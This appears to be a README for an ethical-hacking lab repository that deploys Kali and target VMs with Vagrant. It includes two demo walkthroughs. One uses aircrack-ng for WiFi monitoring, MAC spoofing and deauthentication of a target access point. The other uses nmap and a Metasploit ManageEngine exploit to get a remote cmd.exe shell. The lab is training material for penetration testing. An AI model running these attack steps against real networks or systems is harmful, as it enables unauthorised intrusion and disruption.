# DISCLAIMER

This information provided is for informational and educational purpose only. Please do not attempt to violate the law with anything obtained from here. The misuse of the information in this repository can result in criminal charges brought against any person(s) in question.

**JUST DON'T BE EVIL!** 

## What is Ethical Hacking?

Ethical hacking involves an authorized attempt to gain unauthorized access to a computer system, application, or data. Carrying out an ethical hack involves duplicating strategies and actions of malicious attackers. This practice helps to identify security vulnerabilities which can then be resolved before a malicious attacker has the opportunity to exploit them.

Also known as “white hats,” ethical hackers are security experts that perform these assessments. The proactive work they do helps to improve an organization’s security posture. With prior approval from the organization or owner of the IT asset, the mission of ethical hacking is opposite from malicious hacking.

* source: https://www.synopsys.com/glossary/what-is-ethical-hacking.html

# Getting Started

## Information & Resources

**Kali Linux** - Debian-derived Linux distribution designed for digital forensics and penetration testing. It is maintained and funded by Offensive Security.

* https://www.kali.org/docs/

**Aircrack-NG** - Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on multiple areas of WiFi security: Monitoring, Attacking, Testing, and Cracking.

* https://www.aircrack-ng.org/

**Metasploit** - A collaboration between the open source community and Rapid7, Metasploit helps security teams do more than just verify vulnerabilities, manage security assessments, and improve security awareness; it empowers and arms defenders to always stay one step (or two) ahead of the game.

* https://www.metasploit.com/

**Metaspoloitable3** - a free virtual machine that allows you to simulate attacks largely using Metasploit. It has been used by people in the security industry for a variety of reasons: such as training for network exploitation, exploit development, software testing, technical job interviews, sales demonstrations, or CTF junkies who are looking for kicks, etc :-)

* https://www.rapid7.com/blog/post/2016/11/15/test-your-might-with-the-shiny-new-metasploitable3/

**Nmap** - Nmap ("Network Mapper") is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X. In addition to the classic command-line Nmap executable, the Nmap suite includes an advanced GUI and results viewer (Zenmap), a flexible data transfer, redirection, and debugging tool (Ncat), a utility for comparing scan results (Ndiff), and a packet generation and response analysis tool (Nping).

* https://nmap.org/download.html

**EC-Council** - Certified Ethical Hacker (CEH) will teach you the latest commercial-grade hacking tools, techniques, and methodologies used by hackers and information security professionals to lawfully hack an organization.

* https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/

# Prerequisites

This is the list of prerequisite software you need to deploy the sandbox ethical hacking environment.

**Git**
* Download Git from here: https://github.com/git-for-windows/git/releases/download/v2.32.0.windows.2/Git-2.32.0.2-64-bit.exe

**Vagrant**
* Download Vagrant from here: https://releases.hashicorp.com/vagrant/2.2.17/vagrant_2.2.17_x86_64.msi

**Oracle VirtualBox**
* Download VirtaulBox from here: https://download.virtualbox.org/virtualbox/6.1.22/VirtualBox-6.1.22-144080-Win.exe

## Needed Hardware

A wireless Adapter that supports monitor mode and packet injection
* Suggested: 
    * Alfa AWUS036ACS 802.11ac AC600 Wi-Fi Wireless Network Adapter - https://amzn.to/2TkbJz5
    * Alfa AWUS036NHA - Wireless B/G/N USB Adaptor - https://amzn.to/3ilyAmq    
<br>
# Deployment of Virtual Environment

1. Open Powershell; Clone the repo.
   ```sh
   git clone https://github.com/souja67/ethical-hacking.git

![image](https://user-images.githubusercontent.com/25991921/126594021-68f29970-c758-42a5-8b15-56cc6312bb43.png)

2. Change to repository directory.
   ```sh
   cd .\ethcical-hacking\

![image](https://user-images.githubusercontent.com/25991921/126594133-f202fe6d-ba5d-4b65-be2e-c1e2305f7fac.png)

3. Install Virtualbox Extension Pack.
    ```sh
    & "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" extpack install .\misc\Oracle_VM_VirtualBox_Extension_Pack-6.1.24.vbox-extpack

![image](https://user-images.githubusercontent.com/25991921/126594375-f2d1a871-718e-4710-8729-9611441fd1b9.png)

4. Accept License Agreement.
    ```sh
    Type 'y' to accept; press Enter

![image](https://user-images.githubusercontent.com/25991921/126594441-d223dff2-80ad-4256-9220-2dddc2bf6f68.png)

5. Deploy initial virtual environment (Will take some time depending on internet connection).
   ```sh
   vagrant up

![image](https://user-images.githubusercontent.com/25991921/126594631-b196abc5-95e7-4317-a1f1-92b734e2240d.png)

6. Need to shutdown our Kali virtual machine temporarily.
   ```sh
   vagrant halt kali

![image](https://user-images.githubusercontent.com/25991921/126594935-d0d166f9-07cc-472d-bf9e-c65026d1232f.png)

7. Open Virtualbox; Go to settings of Kali virtual machine. <br>

![image](https://user-images.githubusercontent.com/25991921/126595881-c7721324-cf17-432d-abff-affb2cbacf30.png)

8. Enable USB controller on Kali virtual machine. <br>

![image](https://user-images.githubusercontent.com/25991921/126596146-9fe4b7f6-94c5-4c96-ab45-1d8cc38c1c07.png)

9. Power on Kali virtual machine
   ```sh
   vagrant up kali

10. Plugin USB wireless adapter and add it to Kali virtual machine.

![image](https://user-images.githubusercontent.com/25991921/126593831-2560bc2f-5b99-4a72-a044-5522c4092bca.png)

   

# Demo #1

## Demo Questions

* How many channels are available on 2.4Ghz Wifi frequency?

* Why do we need to change the mode of the wireless adapter used for wireless attacks?

* What's the purpose of changing the MAC Address of the wireless adapter used to perform wireless attacks?

* Does hiding your SSID protect your wireless network from wireless attacks?

* What measures can be taken to secure a WiFi network?
<br>
<br>

## Wireless Penetration Testing Demo

1. Login to Kali Linux virtual machine <br>
    ```sh
    username: vagrant
    password: vagrant

![image](https://user-images.githubusercontent.com/25991921/126595162-1e1f5036-a61a-4905-abaf-6d252ca240db.png)

2. Open Terminal; Check to make sure wireless adapter exist
    ```sh
    sudo ifconfig | grep wlan0

![image](https://user-images.githubusercontent.com/25991921/126598327-0d9f9c4c-549f-4aa3-836b-9a6ac9509095.png)


3. Kill any potential problem processes within Kali Linux virtual machine
    ```sh
    sudo airmon-ng check kill

4. Set wireless adapter to monitor mode (Managed mode by default)
    ```sh
    sudo airmon-ng start wlan0

5. Set wireless adapter offline
    ```sh
    sudo ifconfig wlan0 down    

6. Change MAC Address
    ```sh
    sudo macchanger -r wlan0

7. Start sniffing wireless packets
    ```sh
    sudo airodump-ng wlan0

8. Find target wifi access point to be PWND!

9. Filter packets down to focus on viction wifi access point
    ```sh
    airodump-ng -c 11 --bssid CC:E1:D5:30:51:F8-w ~/ethical-hacking/misc/hack-01 wlan0

* airodump-ng : For packet capturing
* -c : Channel
* –bssid : MAC address of a wireless access point(WAP).
* -w : The Directory where you want to save the file(Password File).
* wlan0 : Name of the interface.

10. Deauthorize client from wifi network
    ```sh
    aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0

* aireplay-ng : To inject frames
* -0 : For deauthentication
* 10 : No. of deauthentication packets to be sent
* -a : For the bssid of the target network
* wlan0 : Name of the interface. 
<br>
<br>

# Demo #2

## Using Metasploit Demo

1. nmap -Pn -sn 192.168.22.0/24
2. nmap -A 192.168.22.11
3. searchsploit 
3. msfconsole
4. use exploit /windows/http/manageengine_connectionid_write
5. set RHOST 192.168.56.103. *Remember there's two IP's configured. if one IP doesn’t work, try the other one*
6. set RPORT 8383
7. set SSL true
8. set LHOST 192.168.90.5
9. execute -f cmd.exe -i -H
10. hostname / whoami